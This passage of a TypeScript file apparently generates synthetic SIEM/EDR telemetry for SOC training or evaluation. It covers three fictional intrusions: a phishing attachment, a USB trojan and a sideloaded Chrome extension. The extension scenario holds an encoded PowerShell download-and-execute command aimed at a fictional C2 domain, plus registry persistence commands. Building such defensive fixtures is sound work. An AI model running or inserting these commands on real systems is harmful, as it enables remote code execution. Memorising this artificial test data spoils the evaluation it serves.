      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: victim.ip,
      severity: "informational",
      description: "r.avraham opened the delivery-notice message in Outlook on the web (MailItemsAccessed, Bind).",
      raw: {
        "data.office365.Operation": "MailItemsAccessed",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": victim.email,
        "data.office365.MailboxOwnerUPN": victim.email,
        "data.office365.ResultStatus": "Succeeded",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy",
        "data.office365.OperationProperties.MailAccessType": "Bind",
        "data.office365.OperationCount": "1",
        "data.office365.Folders.Path": "\\Inbox",
        "data.office365.Folders[0].FolderItems[0].InternetMessageId": msgId,
      },
    },
    {
      // The web-proxy view of the download: the attachment leaves Exchange Online over the user's browser session.
      id: "evt_pm_01f_download", ts: T(5 * MIN + 18_000),
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      hostname: victim.hostname, user_email: victim.email, src_ip: egress, dst_ip: "52.98.152.34",
      severity: "informational",
      file: { name: "Delivery_Notice_48213.zip", path: "Delivery_Notice_48213.zip", size: 18422 },
      network: {
        url: "https://outlook.office365.com/owa/attachment.ashx?id=AAMkAGQ3ZjRhOGM2LTRlMjEtNGZhYy1iMGUxAAA%3D&attcnt=1&attid0=BAABEAAcQ7Z1Hq0e",
        method: "GET", status: 200, bytes_out: 1180, bytes_in: 19240, user_agent: chromeUa,
      },
      description: "Zscaler Internet Access logged the download of Delivery_Notice_48213.zip from Outlook on the web by r.avraham's browser.",
      raw: {
        "zscaler.login": "r.avraham", "zscaler.cip": victim.ip,
        "zscaler.action": "Allowed", "zscaler.reqmethod": "GET",
        "zscaler.urlcategory": "Professional Services", "zscaler.appname": "Microsoft Outlook",
      },
    },
    {
      id: "evt_pm_01c_save", ts: T(5 * MIN + 20_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low", mitre_technique: "T1566.001",
      file: { path: zipPath, sha256: zipHash, size: 18422 },
      // A webmail download - the same in an M365 or a Google Workspace shop (no desktop mail client named).
      process: chromeProc,
      description: "chrome.exe on WS-HR-1182 saved Delivery_Notice_48213.zip from the webmail session to r.avraham's Downloads folder (same SHA256 as the email attachment).",
      raw: { "crowdstrike.event_simpleName": "ZipFileWritten", "file.path": zipPath, "file.hash.sha256": zipHash, "host.name": victim.hostname, "user.name": "NEXACORP\\r.avraham" },
    },
    {
      id: "evt_pm_01d_extract", ts: T(5 * MIN + 45_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "medium", mitre_technique: "T1204.002",
      file: { path: exePath, sha256: fileHash, size: 391168 },
      process: explorerProc,
      description: "explorer.exe on WS-HR-1182 extracted Delivery_Notice_48213.pdf.exe from the ZIP into a Delivery_Notice_48213 folder under Downloads.",
      raw: { "crowdstrike.event_simpleName": "NewExecutableWritten", "file.path": exePath, "file.hash.sha256": fileHash, "host.name": victim.hostname, "user.name": "NEXACORP\\r.avraham" },
    },
    {
      id: "evt_pm_02_execute", ts: T(6 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1204.002",
      description: "r.avraham ran Delivery_Notice_48213.pdf.exe from the extracted folder on WS-HR-1182; explorer.exe was the parent process and the binary is unsigned.",
      process: { ...payloadProc, cmdline: `"${exePath}"` },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "event.action": "process_created",
        "process.pid": "6624",
        "process.executable": exePath,
        "process.name": "Delivery_Notice_48213.pdf.exe",
        "process.command_line": `"${exePath}"`,
        "process.hash.sha256": fileHash,
        "process.code_signature.exists": false,
        "process.code_signature.trusted": false,
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "3140",
        "user.name": "NEXACORP\\r.avraham",
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },
    {
      // The process looks the C2 name up first; the resolver answer is the address it then connects to.
      id: "evt_pm_02a_dns", ts: T(6 * MIN + 43_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "dns_query",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low",
      process: payloadProc,
      dns: { query: c2Domain, query_type: "A", response: c2Ip, rcode: "NOERROR" },
      description: `Delivery_Notice_48213.pdf.exe on WS-HR-1182 resolved ${c2Domain} to ${c2Ip}.`,
      raw: { "crowdstrike.event_simpleName": "DnsRequest", "dns.question.name": c2Domain, "host.name": victim.hostname },
    },
    {
      // The endpoint side of the connection: the process, its hash and the URL it reached.
      id: "evt_pm_02b_connect", ts: T(6 * MIN + 44_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: 51204, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { domain: c2Domain },
      process: payloadProc,
      description: `Delivery_Notice_48213.pdf.exe on WS-HR-1182 connected to ${c2Domain} (${c2Ip}) on port 443.`,
      raw: {
        "crowdstrike.event_simpleName": "NetworkConnectIP4",
        "destination.ip": c2Ip, "destination.port": "443", "destination.domain": c2Domain,
        "source.ip": victim.ip, "source.port": "51204",
        "process.name": "Delivery_Notice_48213.pdf.exe", "process.hash.sha256": fileHash,
        "host.name": victim.hostname, "user.name": "NEXACORP\\r.avraham",
      },
    },
    {
      // First page for the SOC: URL filtering log on the newly registered domain.
      id: "evt_pm_03_beacon", ts: T(6 * MIN + 45_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: 51204, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { bytes_out: 4608, bytes_in: 51200, domain: c2Domain },
      description: "The firewall's URL filtering logged an HTTPS session from WS-HR-1182 to shiptrack-updates-net.xyz, categorised as a newly registered domain; the session was allowed.",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "51204",
        "destination.ip": c2Ip, "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "ssl",
        "pan.app": "ssl", "pan.action": "alert", "pan.rule": "Outbound-Web-Users",
        "network.bytes_out": "4608", "network.bytes_in": "51200",
        "dns.query_domain": c2Domain,
        "url.category": "newly-registered-domain",
        "action_result": "allow",
      },
    },
    c2Session("evt_pm_03a_session2", T(7 * MIN + 45_000), 51390, 1024, 8192, 12),
    c2Session("evt_pm_03b_session3", T(8 * MIN + 30_000), 51612, 38_000, 2_100, 24),
    {
      // The sensor kills the process after its C2 traffic: a behavioural prevention, not a file signature.
      id: "evt_pm_04_detect", ts: T(9 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "edr_alert",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "critical", mitre_technique: "T1071.001", is_detection: true,
      file: { path: exePath, sha256: fileHash, size: 391168 },
      process: { ...payloadProc, cmdline: `"${exePath}"` },
      description: "The EDR terminated Delivery_Notice_48213.pdf.exe on WS-HR-1182 about three minutes after the process started and two minutes after its first connection to shiptrack-updates-net.xyz; the file stays on disk.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.DetectName": "NetworkConnectionFromUnsignedDownloadsExecutable",
        "crowdstrike.Tactic": "Command and Control",
        "threat.tactic.id": "TA0011",
        "crowdstrike.Technique": "Application Layer Protocol: Web Protocols",
        "threat.technique.id": "T1071",
        "threat.technique.subtechnique.id": "T1071.001",
        "crowdstrike.PatternDispositionDescription": "Prevention, Kill Process",
        "crowdstrike.SeverityName": "Critical",
        "process.hash.sha256": fileHash,
        "host.name": victim.hostname,
        "action_result": "process_killed",
      },
    },
    {
      id: "evt_pm_05_zap", ts: T(11 * MIN),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_quarantined",
      user_email: victim.email,
      severity: "medium", mitre_technique: "T1566.001",
      description: "Zero-hour auto purge (ZAP) moved the \"Your Package Could Not Be Delivered\" message from r.avraham's inbox to quarantine with a Malware verdict.",
      raw: { ...mail, "Action": "Moved to quarantine", "ActionTrigger": "ZAP", "ActionResult": "Success", "ThreatTypes": "Malware", "DeliveryLocation": "Quarantine" },
    },
  ];

  return { title: "EDR alert on an HR workstation", events, T, MIN, c2Domain, c2Ip, fileHash, zipHash, senderIp, senderDomain };
}

/** Telemetry half of `buildUsbMalwareScenario`: the events and the story title, no answer key. */
export function usbMalwareScenarioEvents() {
  const B = new Date("2026-05-22T13:30:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-OPS-2214", email: "m.levi@nexacorp.com", ip: "10.10.55.19" };
  const fileHash = makeSha256("usb_backup_tool_exe_trojan_dropper");
  const usbSerial = "4C530001071117107564";
  // Story-specific infrastructure (no other storyline uses this address).
  const c2Domain = "sync-winbackup.net";
  const c2Ip = "91.215.85.17";
  const exe = "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe";
  const explorerProc = { name: "explorer.exe", pid: 3140, path: "C:\\Windows\\explorer.exe", user: "NEXACORP\\m.levi", integrity: "medium" as const };
  const payloadProc = {
    name: "USB_Backup_Tool.exe", pid: 7712, path: exe, parent_name: "explorer.exe", parent_pid: 3140,
    user: "NEXACORP\\m.levi", integrity: "medium" as const, hash: { sha256: fileHash },
  };
  const fqdn = "WS-OPS-2214.nexacorp.com";
  // The Windows Security header every record of this host shares (EVTX System block, flattened as the SIEM ingests it).
  const winHead = (id: string, recordId: string) => ({
    "winlog.event_id": id, "winlog.channel": "Security", "winlog.computer_name": fqdn,
    "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.record_id": recordId, "event.code": id,
  });
  const systemSubject = {
    "winlog.event_data.SubjectUserSid": "S-1-5-18", "winlog.event_data.SubjectUserName": "WS-OPS-2214$",
    "winlog.event_data.SubjectDomainName": "NEXACORP", "winlog.event_data.SubjectLogonId": "0x3E7",
  };
  // One short HTTPS session to the C2 address as the firewall logs it when the session ends.
  const c2Session = (id: string, ts: string, sport: number, bytesOut: number, bytesIn: number, elapsed: number): TelemetryEvent => ({
    id, ts,
    source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
    hostname: victim.hostname, user_email: victim.email,
    src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: sport, protocol: "tcp",
    severity: "medium",
    network: { bytes_out: bytesOut, bytes_in: bytesIn },
    description: `An HTTPS session from WS-OPS-2214 to ${c2Ip} on port 443 ended after ${elapsed} seconds (${bytesOut} bytes sent).`,
    raw: {
      "event.action": "network-connection-allowed", "event.outcome": "success",
      "source.ip": victim.ip, "source.port": String(sport),
      "destination.ip": c2Ip, "destination.port": "443",
      "network.protocol": "tcp", "network.transport": "tcp",
      "pan.app": "ssl", "pan.action": "allow", "pan.rule": "Outbound-Web-Users",
      "pan.category": "newly-registered-domain", "pan.elapsed_time": String(elapsed), "pan.session_end_reason": "tcp-fin",
      "network.bytes_out": String(bytesOut), "network.bytes_in": String(bytesIn),
      "action_result": "allow",
    },
  });

  const events: TelemetryEvent[] = [
    {
      // The drive is recognised by the OS: the device identity (vendor id, serial) that ties it to the file copied off it.
      id: "evt_usb_00a_pnp", ts: T(-1 * MIN),
      source: "windows_security", vendor: "Windows Security", event_type: "nac_allow",
      hostname: victim.hostname, src_ip: victim.ip,
      severity: "low", mitre_technique: "T1200",
      description: "Windows recognised a new external USB mass-storage device (SanDisk Cruzer Blade, serial 4C530001071117107564) on WS-OPS-2214.",
      raw: {
        ...winHead("6416", "2210481"), ...systemSubject,
        "winlog.event_data.DeviceId": `USB\\VID_0781&PID_5567\\${usbSerial}`,
        "winlog.event_data.DeviceDescription": "USB Mass Storage Device",
        "winlog.event_data.ClassId": "{36fc9e60-c465-11cf-8056-444553540000}",
        "winlog.event_data.ClassName": "USB",
        "winlog.event_data.VendorIds": "USB\\VID_0781&PID_5567&REV_2600\nUSB\\VID_0781&PID_5567",
        "winlog.event_data.CompatibleIds": "USB\\Class_08&SubClass_06&Prot_50\nUSB\\Class_08&SubClass_06\nUSB\\Class_08",
        "winlog.event_data.LocationInformation": "Port_#0003.Hub_#0001",
      },
    },
    {
      id: "evt_usb_00b_disk", ts: T(-1 * MIN + 1_000),
      source: "windows_security", vendor: "Windows Security", event_type: "nac_allow",
      hostname: victim.hostname, src_ip: victim.ip,
      severity: "informational",
      description: "Windows recognised the disk drive exposed by that USB device (SanDisk Cruzer Blade) on WS-OPS-2214.",
      raw: {
        ...winHead("6416", "2210483"), ...systemSubject,
        "winlog.event_data.DeviceId": `USBSTOR\\DISK&VEN_SANDISK&PROD_CRUZER_BLADE&REV_1.27\\${usbSerial}&0`,
        "winlog.event_data.DeviceDescription": "Disk drive",
        "winlog.event_data.ClassId": "{4d36e967-e325-11ce-bfc1-08002be10318}",
        "winlog.event_data.ClassName": "DiskDrive",
        "winlog.event_data.VendorIds": "USBSTOR\\DiskSanDisk_Cruzer_Blade____1.27\nUSBSTOR\\DiskSanDisk_Cruzer_Blade____\nUSBSTOR\\SanDisk_Cruzer_Blade____1\nSanDisk_Cruzer_Blade____1",
        "winlog.event_data.CompatibleIds": "USBSTOR\\Disk\nUSBSTOR\\RAW\nGenericDisk\nRAW",
        "winlog.event_data.LocationInformation": "0000.0014.0000.003.000.000.000.000.000",
      },
    },
    {
      // Removable-storage auditing: Explorer opens the file on E:\ for reading just before the copy lands on the Desktop.
      id: "evt_usb_00c_read", ts: T(-2_000),
      source: "windows_security", vendor: "Windows Security", event_type: "file_access",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low",
      process: explorerProc,
      file: { name: "USB_Backup_Tool.exe", path: "E:\\USB_Backup_Tool.exe", size: 245760 },
      description: "explorer.exe read E:\\USB_Backup_Tool.exe on the removable drive (Audit Removable Storage).",
      raw: {
        ...winHead("4663", "2210527"),
        "winlog.event_data.SubjectUserName": "m.levi",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.ObjectServer": "Security",
        "winlog.event_data.ObjectType": "File",
        "winlog.event_data.ObjectName": "E:\\USB_Backup_Tool.exe",
        "winlog.event_data.HandleId": "0x1a4c",
        "winlog.event_data.AccessList": "%%4416",
        "winlog.event_data.AccessMask": "0x1",
        "winlog.event_data.ProcessId": "0xc44",
        "winlog.event_data.ProcessName": "C:\\Windows\\explorer.exe",
        "winlog.event_data.ResourceAttributes": "-",
      },
    },
    {
      id: "evt_usb_01_copy", ts: T(0),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low",
      file: { path: exe, sha256: fileHash, size: 245760 },
      // explorer.exe is the writer of a drag-and-drop copy (DeviceFileEvents / PeFileWritten actor).
      process: explorerProc,
      description: "USB_Backup_Tool.exe was copied from the removable drive (E:\\) to the Desktop on WS-OPS-2214.",
      raw: {
        "crowdstrike.event_simpleName": "NewExecutableWritten",
        "event.action": "file_written",
        "file.path": exe,
        "file.hash.sha256": fileHash,
        "file.code_signature.exists": false, "file.code_signature.trusted": false,
        "user.name": "NEXACORP\\m.levi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_usb_02_execute", ts: T(3 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1204.002",
      description: "m.levi ran USB_Backup_Tool.exe on WS-OPS-2214 with explorer.exe as the parent process; the binary is unsigned.",
      process: { ...payloadProc, cmdline: `"${exe}"` },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "process.pid": "7712",
        "process.executable": exe,
        "process.name": "USB_Backup_Tool.exe",
        "process.hash.sha256": fileHash,
        "process.code_signature.exists": false,
        "process.code_signature.trusted": false,
        "process.parent.name": "explorer.exe",
        "user.name": "NEXACORP\\m.levi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_usb_03_persist", ts: T(3 * MIN + 20_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "registry_set",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1547.001",
      description: "USB_Backup_Tool.exe wrote a Registry Run key on WS-OPS-2214 that relaunches it at every m.levi logon.",
      // The writer is the same process instance step 2 started (pid 7712), so the
      // registry record's actor links back to that process creation.
      process: payloadProc,
      registry: {
        path: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        key: "SystemBackupSvc",
        value: exe,
      },
      raw: {
        "crowdstrike.event_simpleName": "AsepValueUpdate",
        "event.action": "registry_value_set",
        "registry.path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "registry.key": "SystemBackupSvc",
        "registry.value": exe,
        "process.name": "USB_Backup_Tool.exe",
        "process.hash.sha256": fileHash,
        "host.name": victim.hostname,
        "user.name": "NEXACORP\\m.levi",
      },
    },
    {
      // The process resolves its server by name before it connects.
      id: "evt_usb_03a_dns", ts: T(3 * MIN + 49_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "dns_query",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low",
      process: payloadProc,
      dns: { query: c2Domain, query_type: "A", response: c2Ip, rcode: "NOERROR" },
      description: `USB_Backup_Tool.exe on WS-OPS-2214 resolved ${c2Domain} to ${c2Ip}.`,
      raw: { "crowdstrike.event_simpleName": "DnsRequest", "dns.question.name": c2Domain, "host.name": victim.hostname },
    },
    {
      // The internal resolver's own record of the same lookup.
      id: "evt_usb_03a2_dns_server", ts: T(3 * MIN + 49_000),
      source: "dns", vendor: "Windows DNS Server", event_type: "dns_query",
      hostname: victim.hostname, src_ip: victim.ip, severity: "low",
      dns: { query: c2Domain, query_type: "A", response: c2Ip, rcode: "NOERROR" },
      description: `The internal DNS server answered ${victim.hostname}'s A query for ${c2Domain} with ${c2Ip}.`,
      raw: { "dns.question.name": c2Domain, "dns.question.type": "A", "dns.response_code": "NOERROR", "dns.resolved_ip": c2Ip, "source.ip": victim.ip },
    },
    {
      // A beacon before the kill - gives containment an indicator (domain + IP) beyond the file hash.
      id: "evt_usb_03b_beacon", ts: T(3 * MIN + 50_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: 52140, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { domain: c2Domain },
      process: payloadProc,
      description: `USB_Backup_Tool.exe on WS-OPS-2214 connected to ${c2Domain} (${c2Ip}) on port 443.`,
      raw: {
        "crowdstrike.event_simpleName": "NetworkConnectIP4",
        "destination.ip": c2Ip, "destination.port": "443", "destination.domain": c2Domain,
        "source.ip": victim.ip, "source.port": "52140",
        "process.name": "USB_Backup_Tool.exe", "process.hash.sha256": fileHash,
        "host.name": victim.hostname, "user.name": "NEXACORP\\m.levi",
      },
    },
    c2Session("evt_usb_03c_session1", T(3 * MIN + 56_000), 52140, 1480, 5230, 6),
    {
      // The SIEM's threat-intelligence analytic matches the looked-up name against its indicator feed.
      id: "evt_usb_03d_ti_match", ts: T(4 * MIN + 5_000),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "threat_intel_match",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "medium", mitre_technique: "T1071.001", is_detection: true,
      description: `Microsoft Sentinel matched a domain indicator from its threat-intelligence feed (${c2Domain}) to a DNS lookup from WS-OPS-2214.`,
      raw: {
        "AlertName": "TI map Domain entity to DnsEvents",
        "AlertSeverity": "Medium",
        "ProductName": "Azure Sentinel",
        "ProviderName": "ASI Scheduled Alerts",
        "AlertType": "6a1f3c92-0d5e-4b87-a3c4-91e7d2b50f68_0c8e4a17-2f93-4d61-b5a8-3e7c19d4a602",
        "Status": "New",
        "Tactics": "Impact",
        "CompromisedEntity": victim.hostname,
        "ExtendedProperties.Query Period": "14.00:00:00",
        "ExtendedProperties.Indicator Domain": c2Domain,
        "ExtendedProperties.Indicator Confidence": 80,
        "ExtendedProperties.Resolved IP": c2Ip,
        "Entities": JSON.stringify([
          { $id: "2", HostName: victim.hostname, DnsDomain: "nexacorp.com", Type: "host" },
          { $id: "3", Name: "m.levi", NTDomain: "NEXACORP", Type: "account" },
          { $id: "4", DomainName: c2Domain, Type: "dns" },
          { $id: "5", Address: victim.ip, Type: "ip" },
        ]),
      },
    },
    c2Session("evt_usb_03e_session2", T(4 * MIN + 44_000), 52171, 2210, 6890, 24),
    {
      id: "evt_usb_04_detect", ts: T(5 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "critical", mitre_technique: "T1547.001",
      file: { path: exe, sha256: fileHash, size: 245760 },
      process: payloadProc,
      description: "The EDR terminated USB_Backup_Tool.exe on WS-OPS-2214 and quarantined the file; the detection does not record the HKCU\\...\\Run SystemBackupSvc value being removed.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.Technique": "Boot or Logon Autostart Execution: Registry Run Keys",
        "threat.technique.id": "T1547",
        "threat.technique.subtechnique.id": "T1547.001",
        "crowdstrike.PatternDispositionValue": "2304",
        "crowdstrike.PatternDispositionDescription": "Prevention, Kill Process, Quarantine File",
        "crowdstrike.SeverityName": "Critical",
        "process.hash.sha256": fileHash,
        "host.name": victim.hostname,
        "action_result": "process_killed, quarantined",
      },
    },
  ];

  return { title: "EDR quarantine on an operations workstation", events, T, MIN, fileHash, c2Domain, c2Ip, usbSerial };
}

/** Telemetry half of `buildBrowserExtensionMalwareScenario`: the events and the story title, no answer key. */
export function browserExtensionMalwareScenarioEvents() {
  const B = new Date("2026-05-25T09:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-MKT-3301", email: "d.cohen@nexacorp.com", ip: "10.10.62.18" };
  const c2Domain = "cdn-assets-update.xyz";
  // Story-specific infrastructure (no other storyline uses this address).
  const c2Ip = "172.86.75.90";
  const dlDomain = "perf-boost-extension.net";
  const dlIp = "38.180.24.51";
  const stagerHash = makeSha256("browser_ext_stage2_payload");
  const zipHash = makeSha256("perf_boost_ext_unpacked_zip");
  const extId = "affloghcebbkcmnolgfhbiphpnbekoj";
  const extDir = "C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked";
  const nmHostCmd = `${extDir}\\host\\perf_boost_host.cmd`;
  const nmManifest = `${extDir}\\host\\com.perfboost.host.json`;
  // https payload, so the decoded URL scheme/port match the firewall egress (443).
  const encodedCmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAGEAcwBzAGUAdABzAC0AdQBwAGQAYQB0AGUALgB4AHkAegAvAGIALgBwAHMAMQAnACkA";

  const events: TelemetryEvent[] = [
    {
      // How the extension arrived: chrome downloaded a ZIP from a lure site, then
      // the unpacked folder (with its native-messaging manifest) appeared in Downloads.
      id: "evt_bext_00a_download", ts: T(-6 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low", mitre_technique: "T1176.001",
      file: { path: `${extDir}.zip`, sha256: zipHash, size: 112640 },
      process: {
        name: "chrome.exe", pid: 8816, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      description: `chrome.exe on WS-MKT-3301 downloaded perf_boost_ext_unpacked.zip from ${dlDomain} to d.cohen's Downloads folder.`,
      raw: {
        "crowdstrike.event_simpleName": "ZipFileWritten",
        "file.path": `${extDir}.zip`,
        "file.hash.sha256": zipHash,
        "host.name": victim.hostname, "user.name": "NEXACORP\\d.cohen",
      },
    },
    {
      // The native-messaging host registration — the HKCU key that makes Chrome
      // willing to launch the host executable. Without this the launch below is impossible.
      id: "evt_bext_00b_nmreg", ts: T(-4 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "registry_set",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "medium", mitre_technique: "T1176.001",
      process: {
        name: "cmd.exe", pid: 7004, parent_name: "explorer.exe", parent_pid: 3140,
        cmdline: `cmd.exe /c reg add "HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\com.perfboost.host" /ve /d "${nmManifest}" /f`,
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      registry: {
        path: "HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\com.perfboost.host\\(Default)",
        key: "(Default)",
        value: nmManifest,
      },
      description: "A Chrome NativeMessagingHosts registration for com.perfboost.host was written under HKCU on WS-MKT-3301, pointing at a manifest in d.cohen's Downloads folder.",
      raw: {
        "crowdstrike.event_simpleName": "RegGenericValueUpdate",
        "registry.path": "HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\com.perfboost.host\\(Default)",
        "registry.key": "(Default)",
        "registry.value": nmManifest,
        "process.name": "cmd.exe",
        "host.name": victim.hostname, "user.name": "NEXACORP\\d.cohen",
      },
    },
    {
      id: "evt_bext_01_sideload", ts: T(0),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low", mitre_technique: "T1176.001",
      description: "Chrome relaunched on WS-MKT-3301 with a --load-extension flag pointing to an unpacked folder in d.cohen's Downloads directory.",
      process: {
        name: "chrome.exe", pid: 8816, parent_name: "explorer.exe", parent_pid: 3140,
        cmdline: "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=\"C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked\"",
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.Tactic": "Persistence",
        "threat.tactic.id": "TA0003",
        "crowdstrike.Technique": "Browser Extensions",
        "threat.technique.id": "T1176",
        "threat.technique.subtechnique.id": "T1176.001",
        "crowdstrike.SeverityName": "Low",
        "crowdstrike.DetectDescription": "Developer-mode extension load flag; Extension folder outside Web Store cache path; Folder located in user Downloads",
        "event.action": "process_created",
        "process.pid": "8816",
        "process.executable": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "process.command_line": "--load-extension=\"C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked\"",
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "3140",
        "user.name": "NEXACORP\\d.cohen",
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },
    {
      id: "evt_bext_02_nmhost", ts: T(1 * MIN + 30_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.003",
      // A Chrome extension can't launch processes itself; it messages a registered
      // native-messaging host, which Chrome runs. Here that host is a .cmd wrapper.
      description: "chrome.exe on WS-MKT-3301 launched its registered native-messaging host — cmd.exe running perf_boost_host.cmd with the extension's chrome-extension:// origin as an argument.",
      process: {
        name: "cmd.exe", pid: 9020, parent_name: "chrome.exe", parent_pid: 8816,
        cmdline: `cmd.exe /d /c "\"${nmHostCmd}\" chrome-extension://${extId}/"`,
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.Tactic": "Execution",
        "threat.tactic.id": "TA0002",
        "crowdstrike.Technique": "Command and Scripting Interpreter: Windows Command Shell",
        "threat.technique.id": "T1059",
        "threat.technique.subtechnique.id": "T1059.003",
        "crowdstrike.SeverityName": "High",
        "crowdstrike.DetectDescription": "Browser launched a native-messaging host; Host is a command-shell wrapper script; chrome-extension origin passed as an argument",
        "event.action": "process_created",
        "process.pid": "9020",
        "process.executable": "C:\\Windows\\System32\\cmd.exe",
        "process.command_line": `cmd.exe /d /c "\"${nmHostCmd}\" chrome-extension://${extId}/"`,
        "process.parent.name": "chrome.exe",
        "process.parent.pid": "8816",
        "user.name": "NEXACORP\\d.cohen",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_bext_03_powershell", ts: T(2 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.001",
      description: "The native-messaging host on WS-MKT-3301 spawned powershell.exe with a hidden window and a Base64-encoded command.",
      process: {
        name: "powershell.exe", pid: 9024, parent_name: "cmd.exe", parent_pid: 9020,
        cmdline: `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ${encodedCmd}`,
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.Tactic": "Execution",
        "threat.tactic.id": "TA0002",
        "crowdstrike.Technique": "Command and Scripting Interpreter: PowerShell",
        "threat.technique.id": "T1059",
